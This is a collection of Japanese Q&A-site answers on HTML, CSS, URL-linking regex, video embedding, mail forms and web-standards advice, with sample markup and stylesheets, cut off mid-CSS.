bodyの中に書かれている文書は、実際のページに表示され、いわゆる「人間が理解する情報」として用いられますが、html内にはその他にも、検索エンジンなどの「プログラムに理解させる情報」がいろいろあります。そのひとつがRDFという記述です。 従って、RDFの内容を書き換えようが、削除しようが、実際に表示される(人間が見る)内容には何ら変化はありません。 ページの情報を収集するプログラムが利用するものだと思って問題ないと思います。
＞ＦＣ２ブログのバックアップファイルのテキストで変換して、またＦＣ２に戻したいと思っていますぅ もちろん。・・・ローカルのperlで行うのです。Perlは、正規表現が得意なのでそのためによく使われる。そのため正規表現の資料も多い。 　activePerl( http://www.activestate.com/activeperl )を持っていると 　いずれにしても、EmEditorだと (s?https?://[-_.!~*'()a-zA-Z0-9;/?:@&=+$,%#]+) → <a href="\1">\1</a> と言うことですよ。後方参照を使います。 　→EmEditor( http://jp.emeditor.com/ )Free版もある。 大抵のURLは、これでOKなはずです。必要なら改行コードを消す必要があるかも htt：//hoge/com/i ndex.html なんてなっていたときのために・・・
<video>タグはHTML5のタグですが、 firefoxの対応はどのバージョンからか分かりません、 あなたのfirefoxのバージョンも分かりませんので・・・ 最新バージョンの12.0では対応していると思いますが！！ iphone(Ipad)は分からないのですが？ ちょっとややこしくなります・・・ 次のサイトより「JW Player」をＤＬし --> http://www.longtailvideo.com/players/jw-flv-play … そのプレーヤー本体（player.swf）をHTMLと同じディレクトリに置いて <script type="text/javascript"> document.write('<embed src="player.swf" \ width="320" height="240" bgcolor="000000" \ allowscriptaccess="always" \ allowfullscreen="true" \ flashvars="author=user\ &file=video.mp4\ &image=null\ &title=sample-mov\ &fullscreen=true" />'); </script> これでfirefoxでは表示されるようになると思います！！ あなたの意図に反しているか分かりませんが、 参考までに・・・
1) HTML上の順番を変える。 2) 親コンテナブロックのz-indexで指定する。 (2)の場合 手持ちサンプルです。 ※タブは＿に置換してあるので戻すこと。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- div.nav, div.affiliate{ ＿width:100%;height:40px;line-height:40px; ＿text-align:center; } div.nav{position:absolute;top:0;left:0;z-index:3;} div.nav ul, div.nav ul li, div.affiliate ul, div.affiliate ul li{ ＿display:block;list-style:none; ＿margin:0;padding:0; } div.nav ul li, div.affiliate ul li{width:24%;float:left;} div.nav ul li a, div.affiliate ul li a{ ＿display:block;width:100%;height:100%; ＿text-decoration:none;border:solid 1px gray; } div.nav ul li a{background-color:yellow;} div.affiliate ul li a{background-color:lime;} div.nav ul li ul li{width:100%;} h1{z-index:0;margin-top:40px;} div.affiliate{z-index:0;} div.nav ul li ul{display:none;} div.nav ul li:hover ul{display:block;} --> ＿</style> </head> <body> ＿<div class="nav"> ＿＿<ul> ＿＿＿<li><a href="/section1">Section1</a> ＿＿＿＿<ul> ＿＿＿＿＿<li><a href="/section1-1">Section1-1</a></li> ＿＿＿＿＿<li><a href="/section1-2">Section1-2</a></li> ＿＿＿＿＿<li><a href="/section1-3">Section1-3</a></li> ＿＿＿＿＿<li><a href="/section1-4">Section1-4</a></li> ＿＿＿＿</ul> ＿＿＿</li> ＿＿＿<li><a href="/section2">Section2</a> ＿＿＿＿<ul> ＿＿＿＿＿<li><a href="/section2-1">Section2-1</a></li> ＿＿＿＿＿<li><a href="/section2-2">Section2-2</a></li> ＿＿＿＿</ul> ＿＿＿</li> ＿＿＿<li><a href="#section3">Section3</a></li> ＿＿＿<li><a href="#section4">Section4</a> ＿＿＿＿<ul> ＿＿＿＿＿<li><a href="/section4-1">Section4-1</a></li> ＿＿＿＿＿<li><a href="/section4-2">Section4-2</a></li> ＿＿＿＿＿<li><a href="/section4-3">Section4-3</a></li> ＿＿＿＿</ul> ＿＿＿</li> ＿＿</ul> ＿</div> ＿<h1>サンプル</h1> ＿<div class="affiliate"> ＿＿<ul> ＿＿＿<li><a href="./A">ABCD</a></li> ＿＿＿<li><a href="./B">BCDE</a></li> ＿＿＿<li><a href="./C">CDEF</a></li> ＿＿＿<li><a href="./D">DEFG</a></li> ＿＿</ul> ＿</div> </body> </html>
ひとまず、スマホ限定なら、html5の属性値が使えるはずなので、typeの値として、number(数値限定)などが使えます。それ以外だとjavascriptを使うことになると思います。 リンク先は未確認ですが、ひとまずこのような種類を探せばよいと思います。 http://plusb.jp/blog/?p=396 ちなみに、ime-modeは、一時他ブラウザでも実装された時期がありますが、基本的には悪しきIEの独自仕様です。
Webサイトの仕様がどういうものかは分かりませんが、私なら、単一の動画ソースで頑張る方法(おそらくその方法はない)よりも、どうすれば複数の動画ソースを扱えるようにできるかを考えますね。たとえば、DropboxやGoogle Driveなどを使えば、外部にデータをおいて、Webサイトから読み込むことも出来るわけですし、もっといえば、Youtubeも使えますよね。何かしらの閲覧制限が必要な場合も問題ないと思いますよ。
HTML、CSSではできません。 Flashの設定で、アスペクト比を固定させてください。
No.1です。 　実際にごく簡単なHTML/CSSをあげておきます。CSSをご覧になるとわかるようにidもclassも使ってません。文書構造だけを頼りにセレクタを書いています。このようにセレクタを記述することで「どの要素にスタイルを適用するか」を指定できますが、idやclass名は無関係です。--利用することはできます。 　言い換えれば、セレクタを記述してくれるソフトなんてありえないのです。これはあなたがするしかありません。class名やidは誰でも(機械--検索エンジンも含む)でもわかるものにしておけば、コピーペーストなんてしなくても良いです。私はスタイルシートを記述するときにHTMLのソースなんて見ません。 ★Another HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) ★W3C CSS 検証サービス ( http://jigsaw.w3.org/css-validator/#validate_by_ … ) 　(オプションでCSS3を選択) ※タブは、＿に置換してあるので戻すこと <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- body>*{margin:0 auto;width:70%;max-width:800px;} h1{margin-top:40px;} h2,p,ol{margin-top:0;margin-bottom:0;line-height:1.4em;} p{text-indent:1em;} h1+ol{position:absolute;top:0;} h1+ol,h1+ol li{display:block;padding:0;list-style:none;} h1+ol{margin-left:15%;text-align:center;} h1+ol li{width:20%; float:left;margin-right:5px;} h1+ol li a{display:block;width:100%;height:100%;text-decoration:none;border:solid 2px gray;} h1+ol li a[href="./product"]{background-color:yellow;} pre{background-color:silver;} code:nth-child(2n){background-color:rgb(220,220,220);} body>div{position:relative;} div>*{margin-left:200px;} div ol{width:180px;position:absolute;top:0;left:0;margin-left:0;} --> ＿</style> </head> <body> ＿<h1>サンプル</h1> ＿<ol> ＿＿<li><a href="../">Top</a></li> ＿＿<li><a href="./books">著書</a></li> ＿＿<li><a href="./product">製品</a></li> ＿＿<li><a href="./profile">プロフィール</a></li> ＿</ol> ＿<div> ＿＿<h2 id="Q">質問</h2> ＿＿<p>私が、HTMLをある程度作ってからCSSを入力していくのですが。いつもこんな感じになります。</p> ＿＿<pre><code>&lt;div id="wraper"&gt;</code> <code>&lt;div class="content"&gt;</code> <code>&lt;div class="content_detail"&gt;</code> <code>&lt;/div&gt;</code> <code>&lt;/div&gt;</code> <code>&lt;/div&gt;</code></pre> ＿＿<p>こんな感じで適当にHTMLを書いて、「wraper」という文字をコピーして、CSSにペースト。閉じタグをつける。</p> ＿＿<p>↓こんな感じです。</p> ＿＿<pre><code>#wraper{</code> <code>}</code></pre> ＿＿<hr> ＿＿<p>いつもいつもコピして、cssでid名やclass名を設定するのが面倒です。</p> ＿＿<p>DWの「新規CSSルール」を押しても、何も入力していない場合は、cssに反映されません</p> ＿＿<h2 id="A">回答</h2> ＿＿<ol> ＿＿＿<li><a href="#Q">質問</a></li> ＿＿＿<li><a href="#A">回答</a></li> ＿＿</ol> ＿</div> </body> </html>
いえ、試すのはそちらで・・ 繰り返しますが、(IEの旧バージョンを気にするなら、)paddingは禁忌です。 tdに対してpaddingを使用するのではなく、その内容のtd input,td selectにmarginを設定しましょう。特にその内包要素にwidthプロパティを設定しているときは。 　また、原因が:hoverによるborderの変化でしたら、td,thに対してline-heightとvertical-alignを設定しても良いでしょう。
それで問題ないはずです。 一度、 Another HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) などで文法チェックしてみたら？？(iframe内で表示するページ) ★:は：に置換してあるので必ず戻すこと <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"> <html> <head> <title>Untitled</title> </head> <body> <div> <h1>インラインフレーム内でリンク移動</h1> <p>親ページ内のインラインフレームに表示したページで、リンク移動をしたいと考えています。</p> <p>親ページはインラインフレームのみ</p> <p>※楽●のカテゴリーページのため親ページにJavascriptなどはつけることができません。</p> <p>インラインフレーム内の表示ページで、例えば&lt;a href="#sale"&gt;セール&lt;/a&gt;とリンクを付け、そのインラインフレーム内のページの(id=sale)セールの項目へ移動させたいと考えています。</p> <h2>サンプル</h2> <p><a href="http：/www.asahi-net.or.jp/~sd5a-ucd/rec-html401j/cover.html#minitoc" target="iframe1">iframe内にの目次へリンク</a>こちらでも・・<a href="http：//www.asahi-net.or.jp/~sd5a-ucd/rec-html401j/cover.html#toc" target="iframe1">詳細目次</a>でも</p> </div> <iframe src="http：//www.asahi-net.or.jp/~sd5a-ucd/rec-html401j/cover.html" width="600" height="800" name="iframe1"> </body> </html>
＞display:table-cell;では表現が難しく、 　意味がわかりません。 　質問では、「CSSなどで指定することによって可能でしょうか？」と書かれていたので、CSSでの方法を示したのですが？？？。 「あるプログラムで中でどうしてもtr要素を横に並べたい」 　^^^^^^^^^^^^^^^^^^^^ ということは、そのプログラムでtrを取り除けば済むことです。あるいは <tr><td>a</td><td>1</td><td>e</td></tr><tr><td>b</td><td>2</td><td>f</td></tr><tr><td>c</td><td>3</td><td>g</td></tr><tr><td>d</td><td>4</td><td>h</td></tr> でも良いはず。 ＞CSSなどで指定することによって可能でしょうか？ 　CSSは、ブラウザでのプレゼンテーションを指定するものです。 　質問を整理してください。いくら考えても、意味不明なのです。 　
H2などの見出しタグに入っているキーワードとして認識していると思いますよ。 <h2><img src="/images/index/h201.png" alt="全国で最も難関と噂される神奈川県運転免許試験場(二俣川)での一発試験(学科試験&amp;お巡りさん乗せて技能試験)で取得。本当にそんなに難しい試験なのか?" title="全国で最も難関と噂される神奈川県運転免許試験場(二俣川)での一発試験(学科試験&amp;お巡りさん乗せて技能試験)で取得。本当にそんなに難しい試験なのか?" height="48" width="955"></h2> この中のaltにある文字列でGoogle検索すると、あなたのサイトが一番上に出てきます。 ただ、あまり長すぎるのもどうでしょうね。 H2というのは見出しですから、文章を入れるのはよろしくありません。文章に対するタイトル（見出し）であるべきですので。ですのでここで問題にするのは見出しタグの中に入れる文字列（テキストでもaltでも）が適切な長さかどうかでしょう。 あなたがaltに入れたキーワードの一番最後の部分「お巡りさん乗せて技能試験)で取得。本当にそんなに難しい試験なのか?」で検索しても、その文章での検索結果はヒットしません。すなわちGoogleはここまで長い見出し文字を見出しとして捉えていない可能性が高いです。 また、別の方の回答にありますが、ロボットを意識するのであれば、このような小技ではなく、正しいHTMLを学んだ方が検索エンジン対策にもつながりますので、そちらを学んだ方が良いかもしれません。 htmllintは非常にチェックが厳しいですが、ここでエラーゼロにならなくても、少なくてもw3.orgでエラーの出ないサイトにしたほうが良いです。（英語ですが） http://validator.w3.org/check?uri=http%3A%2F%2Fw … 正しくHTMLとCSSを学べばHTMLlintで満点も取れますし、今あなたが疑問におもようなロボットの動向も、質問しなくてもわかる程度の技量がついてくると思います。 参考URL：http://goo.gl/sJv67
本当に色々ありますが、小規模なサイトでしたらPHPでよいかと思います。 もちろん、あなたがperlが得意で、サーバーの設定が.htaccessで可能なら、CGIでも良いです。 　またWindowsサーバーならMicrosoft WebMatrixとか・・ 　CGIですと、 /index.html をCGIとして動作するようにして、 |-- /home にすべてのデータを普通のサイトのように入れておいて 　　|-- index.html このディレクトリ以下はCGIとして動作させない。 　　|-- product/ 　　　　　|-- **** として、要求されたURLのPATH_INFOから、必要なファイルを/index.htmlで処理して出力させれば楽です。/home内はまったく普通に作成できます。ただし共通部分はキーワードで置き換えておくなり、目印をつけておく。 「動的なウェブサイト」で探すと良いでしょう。
No.1です。 > PHPはライブラリで実現できればとりあえず十分ではないということですか？ いえ、最終的にお客さんが満足・納得できて納品できれば、それで十分です。 PHPを使うのであれば、多少の融通が利くくらいの知識があるほうがいいと思います。 > これはお客さんのメールアカウントに送られたメールが来るようにすれば良いということですね。 そういうことですね。 > mb_send_mail関数ですか？フォームメーラーとかでは甘いということですね。 いえ、上でもいってるように、PHPじゃなくてもperlを利用してCGIで実現しても構いません。 お客さんのリクエストに対応できればそれでいいと思います。 リクエストされた時に、自分がもってない知識を必要とされた場合、それはラッキーと考えるべきでしょう。 なんにしても、No.2の方もおっしゃってるように、広くて深いので、一歩ずつ確実にこなしていきましょう。 応援しています。
一言で言うと、できません。 　逆の立場で考えると理解できると思いますが、あるページにあなたを誘導したとたんにメールが送信されると、私はあなたの生きているメールアドレスを取得できます。 　そのようなことは、できない仕組みになっていなければなりません。 　さて、リンクでメールユーザーエージェント(MUA)を起動する<a href="mailto:>は、あくまでブラウザのもつおまけ機能です。また、送信されるメールは本来のメール仕様とは異なるものです。スマホなどのブラウザは基本的にそのようになっています。ただし、パソコンや他社のスマホや携帯ではきちんと受信できないことがある。 　本来は<form action="[プログラムのURL]">でフォームに入力されたデータをサーバーのプログラム(CGI)で処理して、メール転送エージェント(MTA)に渡すのが本来の仕様です。 　メールフォーム CGI - Google 検索 ( https://www.google.co.jp/search?q=%E3%83%A1%E3%8 … )などで検索したら、たくさんの情報があると思います。
No.2です。ちょっと質問の趣旨と外れているようなので補足です。 ＞「#global-nav」にある「ul」の「li」という意味のものであれば、「>」 　半角スペースは子孫セレクタ(Descendant selectors)で、子々孫々まで有効ですが 　>は(子供)セレクタ(Child selectors)で、直接の子供だけに有効です。 　なぜ、 ＞記述を初めて見ました。 　子供セレクタは、古いブラウザには理解しないものがあるので、わざわざ子孫セレクタを二度使う。と言うのが正しいのでしょうが、実際には>を知らなくて使われている場合が圧倒的に多いかと思います。 ＞この記述もCSS3からのものなのでしょうか？ 　CSS2で導入されました。 　もうひとつ隣接セレクタ(Adjacent sibling selectors)もとても使い勝手の良いセレクタですが、同様にあまり見かけませんね。
メルマガに載せるURLにご質問の内容にあるような「?mmg」とつけておけば、 Analytics側では設定せずとも、 レポート⇒コンテンツ⇒サイトコンテンツ⇒ランディングページ のデータにランディング時のURLが載りますのでそこで判断できます。 何名誘導されたかを知りたいときは、ランディングページのレポート画面の グラフ右下にある検索ボックスに「?mmg」と入力し検索すれば、 メルマガからのアクセスだとわかります。
既に他の方がいうようにメールフォームなどはCGIやPHPを使うと、より便利です。 それを踏まえたうえでですが、まず、うまくいかない原因として<divタグの位置です。書き換えています。 <div class="form_settings"> <FORM action="mailto:送信先アドレス" method="POST" name="WMMailForm" enctype="text/plain" onsubmit="return WMValidationForm(this);"> <p><span>Name</span><input class="contact" type="text" name="your_name" value="" /></p> <p><span>Email Address</span><input class="contact" type="text" name="your_email" value="" /></p> <p><span>Message</span><textarea class="contact textarea" rows="5" cols="50" name="your_message"></textarea></p> <p style="padding-top: 15px"><span></span><input class="submit" type="submit" name="contact_submitted" value="send" /></p> </form> </div>
そうです。 いつもながらのIEの独自仕様ですから、使うべきではありません。 「うちのブラウザはこんなこともできるよ」と言ってユーザーを取り込もうとした過去の名残です。それは 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから もし【相互運用性確保の】努力が成されなければ、Webは互換性のないフォーマット毎に分け隔てられた世界に分割され、すべての関係者にとっての商業的可能性が減少することとなるであろう、大きなリスクを負うこととなる。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　・・・とても大事なことが書かれていますから、上記引用の前後はしっかり読んでおいてください。・・・ それと、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Conformance: requirements and recommendations (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より の前後も・・ 　ですので、あくまでウェブ標準で作成するように心がけましょう。 　なお、影をつけるためにはCSS3のbox-shadowプロパティ ( http://www.w3.org/TR/css3-background/#the-box-sh … )で可能ですが、対応ブラウザはIE9以降、およびfirefox,Opera,safari,googleChromeなどのモダンブラウザになります。 　ページのデザインに凝りたい気持ちも解らなくははないのですが、HTMLの最大の目的--利点--それがために、ここまで普及したのは、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　であることに立ち戻れば、もっと大事なことがあります。 ★デザインを優先するのでしたら、ワープロやDTP( http://ja.wikipedia.org/wiki/DTP )TPなどで作成して、PDFにするほうが良いです。
>>うまく行かず困っております。 どううまくいっていないのかわからないのですが、、、。 まず、FC2ショッピングカートの管理画面に入ったら、デザイン設定の中のデザイン・表示の設定を選んで、PC用テンプレートの設定　→　カスタムページ作成　に進めば、そこで好きなページを作成することができます。 タイトルとコメントがあり、タイトルで書いたものはメニューに反映されます。 コメントには、あなたが表示したい内容を自由に書けばいいわけです。 あなたの求めている答かどうかわかりませんが、わたしなりに回答させていただきました。
HTML(頭文字ですから大文字でなければなりません)ではなく、スタイルシート・・の問題のようですから Webデザイン・CSS - 教えて！goo ( http://oshiete.goo.ne.jp/category/258/#google_ads1 ) 　のほうが良い質問かもしれません。 　いずれにしても、HTMLがわからないと答えられません。 　もちろん、HTMLは文書構造しか書かれていませんから、その構造を元に書くスタイルシートをどのように書けば良いかと言う質問になるでしょう。 　たとえば、画像のリストが二つあったとして <ol> 　<li><img src="" width="" height="" alt=""></li> 　<li><img src="" width="" height="" alt=""></li> 　<li><img src="" width="" height="" alt=""></li> </ol> <ol> 　<li><img src="" width="" height="" alt=""></li> 　<li><img src="" width="" height="" alt=""></li> 　<li><img src="" width="" height="" alt=""></li> </ol> のようなHTMLで、上のolの画像はページの最上部に、下のolの画像はページの最下段に並べたいとか・・ 　
たとえば、サーバーサイドでselectedを指定する場合、ループの中でいちいち値を判定するのがめんどくさいな。という意味でしょうかね。たしかに、親要素のdefault属性なりに値を設定することができたら、ループ判定いらなくなって楽ですよね。ただ、一度selectを出力するメソッドを組んでしまえば、特別な問題にはならないような。。 MVCとじゃなくて、処理速度の問題を言ってるの？
htmlの種類(？)のおすすめ - HTML - 教えて！goo ( http://oshiete.goo.ne.jp/qa/7490250.html#a )でよいかと・・ ・プログラムとは言いません、マークアップの仕方を学ぶのです。 ・htm4.01ではなく、HTML4.01です。 　みなさん、時間をとって無償で回答しているのです。意にそぐわなくともね。 　よく読みましょう。
＞strictを学ぶ場合、書店を探せばhtmlのstrictの学習書があるのでしょうか？ 　そんなものあるはずがありません。(^^) 　なぜなら、『HTML 4.01 Specification (ja) ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』にすべて書かれているから。 　私も関わったことがあるからわかるのですが、仕様書の存在とそれを読み、理解していれば参考書なんて書く気になりません。それを知らないうちしか、知ったかぶりに書けないからです。 　HTML4.01は、廃れるわけでもなく廃止されるわけでもありません。他のHTMLと同様に存在し続けるでしょう。(HTML3.0は破棄されました。HTML3.2に変更になった) 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから　()は私が追記 1.2 仕様の記述法 　本仕様書は、著者及び実装者という2種類の読者を想定している。著者(すなわちあなた)である読者に対しては、本仕様書が、HTMLの実装詳細に必要以上に触れずに使える、効率的・魅力的でアクセス性のよい文書を著述する際に必要な道具となることを望む。けれども実装者(ブラウザベンダー)である読者は、仕様に適合するユーザエージェントを作成する上で必要となるすべての情報を見つけることができるだろう。 　本仕様書は様々な方法で利用できるだろう。 最初から最後まで通読する。 　本仕様書は、HTMLに関する一般表現から始まり、末尾に向けて徐々に技術的で特殊な内容になっていく。 必要な情報に直接アクセスする。 　できるだけ素早くシンタクスやセマンティクスに関する情報を得るために、オンライン版の仕様書には次の特徴を持たせた。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［HTML4.01仕様書[1.2 仕様の記述法]( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　これほど、完璧な資料があるのに、わざわざ本なんて書きません。(知らなきゃ書ける--その実、本を読んでいると「この著者は、仕様書を読んでないな!!」とわかる記述がたくさんあります。 　たとえば、仕様書に 『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』と書かれているのに、<div id="rightBox">なんて平気で書いていたり・・。本来は、それがナビゲーションでしたら<div class="nav">とすべきですよね。 　HTML5では、HTML4.01で解り難かった--読み取れない人が多すぎた---この部分が改善され、「文書に構造を付加するための」「新しい要素 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … )」が追加されます。その意味で、HTML5も合わせて学ぶことを勧めますが、対応ブラウザがまだまだ少ないこと、まだ未確定部分が多すぎること、通常のページ作成に特に必要なものが少ないことなどから時期尚早だと思います。 　canvasやvideoなどが必要で、スマホに対象を限定したサイトならHTML5でも良いかもしれません。しかし、HTMLの目的である 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　を考えると、やはり早すぎる。 ★しかし、「HTML5 における HTML4 からの変更点 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … )」は絶対に読んでおくべきです。なぜなら、HTML4.01でHTMLを作成するときにどこを皆が読み違えていたかが丁寧に修正されているからです。 1) 仕様書をまずすべて通読しておくこと 2) はじめてのWebドキュメントづくり ( http://www.asahi-net.or.jp/%7Esd5a-ucd/www/ ) 　　のような優れた解説ページで練習すること(HTML4.01の翻訳メンバー) 3) Another HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) 　でチェックしながら作成すること 　 　
質問の意味がわからないのですが ＞ページと背景画像との境界線に影をつけたいのですが 　ページと言うとディスプレイ全体のことを言うことが多いと思いますが、そうすると「ページと背景画像の境界」がどこかわかりません。 a)　ページ全体に背景画像を置き、その上に記事が書かれているブロックを中央に配置して、そのブロック周囲に影を付けたいということでしょうか？ b)　それとも、記事ブロックに背景画像を置きその内部に影を付けたいということ？ c)　それとも、率直に「境界線に影をつけたい」ということですか？ d)　その影は外だけ？ ＞背景の画像はどんなモニターのサイズでも画像の中心やデザインを変えたくなかった e)　「デザインを変えたくなかった」ということは背景画像も伸縮するのですか？ 　モダンブラウザならどれもできるとは思いますが・・・ 　
同じnameをつけましょう
tableの枠線の指定のデフォルトはセル間にスペースをとります。分離ボーダーモデル 詳しい資料は 17. 表について ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　17.6 ボーダー（Borders） ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) すべての、tableに対して分離ボーダーモデルを使用しない場合、 table{border-collapse:collapse;border:1px gray solid;} table td,table th{border:1px gray solid;} と指定しておくと楽です。 なお、HTMLは、 <table summary="なんたらの表" border="1" > で良いです。 　1) HTML4.01strict/ウェブ標準ではbordercolor,cellspacing,cellpaddingは非推奨 　2) ウェブ標準でHTMLを作成・起動させないとブラウザ間の差の吸収で悩まされます。 　3) summary属性はHTML4.01では必須です。 　　　・・・summaryが書かれていて、かつ一意でしたら要素セレクタで表が特定できます。 ★Another HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) ★W3C CSS 検証サービス ( http://jigsaw.w3.org/css-validator/#validate_by_ … ) 　ウェブ標準(HTML4.01strict+CSS2.1)です。 ※タブは、＿に置換してあるので戻すこと。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- /* table共通指定 */ table{ ＿border-collapse:collapse; /* 結合ボーダーモデル */ ＿border:1px gray solid; /* 外枠の設定 */ } table td, table th{/* 見出しセルと値セル */ ＿border:1px gray solid; /* 枠 */ ＿padding:0.25em 0.5em; /* スキマ */ } /* 個別指定 */ table[summary="表のサンプル"]{/* summary属性の値が・・である表 */ border-width:3px; /* 外枠の太さ */ width:40em; /* 幅40文字 */ margin:0 auto;/* 中央配置 */ } table[summary~="表のサンプル"] th{width:12em;}/* 見出しセルの幅 */ table[summary~="表のサンプル"] td{width:26.5em;}/* 値セルの幅 */ --> ＿</style> </head> <body> ＿<h1>サンプル</h1> ＿<table summary="表のサンプル" border="1"> ＿＿<tbody> ＿＿＿<tr> ＿＿＿＿<th abbr="項目">項目</th><th abbr="入力">入力</th> ＿＿＿</tr> ＿＿＿<tr> ＿＿＿＿<th abbr="名">氏名(全角漢字)(W)</th> ＿＿＿＿<td><input type="text" name="name" value="" tabindex="1" size="10" accesskey="W"></td> ＿＿＿</tr> ＿＿＿<tr> ＿＿＿＿<th abbr="読">ふりがな(ひらがな)(Y)</th> ＿＿＿＿<td><input type="text" name="yomi" size="30" tabindex="2" value="" accesskey="Y"></td> ＿＿＿</tr> ＿＿</tbody> ＿</table> </body> </html>
＞私はHTMLを使ったページ製作は初めての初心者です。 　それでしたら、最初に仕様書の下記の部分を読んでおいてください。とっても大事なことです。 ★2.2.1 HTMLの略歴 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ★14.1 スタイルシートの概説 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ＞画像などの配置場所を指定するために使うと思われる何px左右に、何px上下にと ＞動かすhtmlコードとそのコードを上記のコードのどこに書き入れればよいのか 　上を読まれれば、それはHTMLの仕事ではないことがわかると思います。HTML(Hyper Text Markup Language)は、Hyper(リンク機能を持つ)テキストを(文書構成要素で)マークアップする方法---と言う意味です。すなわち、ここは見出しだったら<h1>見出し</h1>、引用文でしたら<blockquote>この部分は引用です。</blockquote>、段落でしたら<p>ここからここまで段落</p>(PはParagraph--段落と言う風に・・・。それをどのように見せるかは、ブラウザが持つスタイルシートに、全面的に任せるのです。 　これが、HTMLを作成するもっとも重要な基本中の基本なのです。「画像などの配置場所を指定する・・」はHTMLではないのです。もっとはっきり言うと、ワープロやDTP ( http://ja.wikipedia.org/wiki/DTP )と、まったく違うのです。 ・・・私もそうでしたから理解できるのですが、初心者がもっとも誤解してしまう部分なのです。私は、HTMLがシンプルだったHTML1(1993)の時代から、HTMLがプレゼンテーションに使われていたHTML3.2(1997)、そしてその反省から生まれたHTML4.01(1999)を経験していますから、もっとも振り回された世代かもしれません。 　あなたが参考にされた資料は、その意味ではあまり良い物ではありません。というか最悪のものを見てしまったと言えるかもしれません。初心者はとにかく仕様書を目を通してください。最初はチンプンカンプンでも一通り読み通しておくこと。そうすれば、必要なときに必要なところをすぐ見つけられますからね。そして、書いてみてはAnother HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … )でチェックしてみる。 　なお、最初に練習するのは「はじめてのWebドキュメントづくり ( http://www.asahi-net.or.jp/%7Esd5a-ucd/www/ )」がよいでしょう。 　スタイルシートは、同様に「REC-CSS2 邦訳 ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … )」があります。練習には「1と2の間辺りからはじめるCSS講座 ( http://www6.plala.or.jp/go_west/beginner/css/ )」とか・・ [CSS]　test.cssと言うファイル名でShift_JISでHTMLと同じ場所に保存する。 @charset "Shift_JIS"; html,body{margin:0;padding:0;} #albumList{ width:640px;height:500px;/* サイズを決める */ margin:0 auto; /* 画面の左右中央に */ border:ridge 3px lime; /* 枠のデザイン */ position:relative;/* 位置の基準とするため */ } #albumList,#albumList li{ display:block;list-style:none;/* リストをブロックに変えておく */ text-align:center;/* 文字は左右中央に */ } #albumList li{ float:left; /* リストは横に並べる */ width:9em; /* 巾はとりあえず 9文字分 */ border:1px gray solid; /* わかりやすくするため枠をつけて */ margin:0.2em 1em; /* 上下と左右のマージン */ } #albumList li p{ position:absolute; /* position:relativeされた#albumListに対して絶対配置 */ width:100%; /* 巾もそれを基準に100% */ 